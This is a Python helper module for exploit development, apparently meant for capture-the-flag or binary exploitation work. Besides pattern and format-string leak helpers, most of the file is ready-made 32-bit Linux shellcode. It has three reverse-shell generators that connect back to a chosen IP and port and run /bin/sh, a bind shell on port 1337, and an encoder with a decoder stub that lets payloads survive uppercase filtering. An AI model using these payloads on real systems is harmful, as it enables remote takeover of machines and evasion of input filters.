#!/usr/bin/env python3
import sys
import socket
import struct


def create_pattern(chunks, chunk_size=4):
    '''Creates a pattern of <chunks> blocks of size <chunk_size>'''
    pattern = [chr(i).encode() for i in range(ord('A'), ord('z')+1)]
    return b''.join(map(lambda x: x * chunk_size, pattern))[:chunks*chunk_size]

def leak_from(f, amount=10, pointer_type=b'p'):
    ''' Creates a pattern to leak from format strings as
        [pointer_number]: pointer_value
    '''
    return b' '.join(b'%u:%%%u$%c' % (i,i,pointer_type) for i in range(f, f+amount))

def connect_to(ip, port):
    ''' Returns a tcp connection socket '''
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    return sock

def make_reverse_tcp(ip, port):
    shellcode = b'\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68'
    shellcode += socket.inet_aton(ip)
    shellcode += b'\x66\x68'
    shellcode += struct.pack('>H', port)
    shellcode += b'\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
    return shellcode

def make_reverse_tcp2(ip, port):
    shellcode = b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68"
    shellcode += socket.inet_aton(ip)
    shellcode += b"\x66\x68"
    shellcode += struct.pack('>H', port)
    shellcode += b"\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80"
    return shellcode

def make_reverse_tcp3(ip, port):
    shellcode =b'\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a\x02\x89\xe1\xcd\x80\x59\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x68'
    shellcode += socket.inet_aton(ip)
    shellcode += b'\x66\x68'
    shellcode += struct.pack('>H', port)
    shellcode += b'\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'
    return shellcode

def make_bind_tcp(port=1337):
    """ Default port 1337 """
    shellcode = b'\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68'
    shellcode += struct.pack('>H', port)
    shellcode += b'\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80'
    return shellcode

def toUpper_decoder(l):
    ''' Generates the decoder for the shellcode encoder
    'encode_toUpper_resistant' with the length of the payload '''
    decoder = b"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff\x57\x5e\x29\xc9\x80\xc1"
    decoder += struct.pack('B', l)
    decoder += b'\x8a\x07\x2c\x41\xc0\xe0\x04\x47\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed'
    return decoder

def encode_toUpper_resistant(sc, add_decoder=True):
    ''' Encodes the shellcode so it resists conversion to uppercase
    [add_decoder]: Prepends the decoder for the shellcode (default: True)
    '''
    shellcode = b''
    if add_decoder:
        shellcode += toUpper_decoder(len(sc)*2)
    shellcode += b''.join(bytes([(i>>4&0xf)+0x41])+bytes([(i&0xf)+0x41]) for i in sc)
    return shellcode

def decode_toUpper_resistant(sc):
    ''' Decodes the payload encoded with 'encode_toUpper_resistant' for
    debugging purposes '''
    if not sc.startswith(toUpper_decoder):
        raise Exception('Shellcode does not passed the decoder check')
    shellcode = sc[len(toUpper_decoder(0)):]
    return b''.join(bytes([(((i-0x41)&0xf)<<4)+((j-0x41)&0xf)]) for i,j in zip(shellcode[::2],shellcode[1::2]))

if __name__ == '__main__':
    print('This should\'t be called directly :)')
    sys.exit()
